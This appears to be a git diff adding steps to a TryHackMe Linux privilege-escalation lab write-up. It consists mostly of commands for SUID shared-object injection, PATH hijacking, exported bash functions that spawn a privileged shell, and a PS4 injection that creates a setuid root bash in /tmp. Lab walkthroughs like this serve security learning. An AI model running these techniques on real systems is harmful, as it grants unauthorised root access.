@@ -567,9 +567,94 @@ chmod +x cve-2016-1531.sh
 ![Manual Root](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/SUID_Known_Exploits_Manual_Root.png)
 
 ### SUID / SGID Executables - Shared Object Injection
+
+
+
+*Read and follow along with the above.*
+
+```cmd
+/usr/local/bin/suid-so
+```
+```cmd
+strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
+```
+
+```cmd
+mkdir /home/user/.config
+```
+
+```cmd
+gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
+```
+
+```cmd
+/usr/local/bin/suid-so
+```
+
 ### SUID / SGID Executables - Environment Variables
+
+
+*Read and follow along with the above.*
+
+```cmd
+/usr/local/bin/suid-env
+```
+
+```cmd
+strings /usr/local/bin/suid-env
+```
+
+```cmd
+gcc -o service /home/user/tools/suid/service.c
+```
+
+```cmd
+PATH=.:$PATH /usr/local/bin/suid-env
+```
+
+```cmd
+/usr/local/bin/suid-env
+```
+
 ### SUID / SGID Executables - Abusing Shell Features (#1)
+
+
+*Read and follow along with the above.*
+
+```cmd
+/usr/local/bin/suid-env2
+```
+
+```cmd
+strings /usr/local/bin/suid-env2
+```
+
+```cmd
+/bin/bash --version
+```
+
+```cmd
+function /usr/sbin/service { /bin/bash -p; }
+export -f /usr/sbin/service
+```
+
+```cmd
+/usr/local/bin/suid-env2
+```
+
 ### SUID / SGID Executables - Abusing Shell Features (#2)
+
+```cmd
+env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
+```
+```cmd
+/tmp/rootbash -p
+```
+```cmd
+rm /tmp/rootbash
+exit
+```
+
 ### Passwords & Keys - History Files
 ### Passwords & Keys - Config Files
 ### Passwords & Keys - SSH Keys
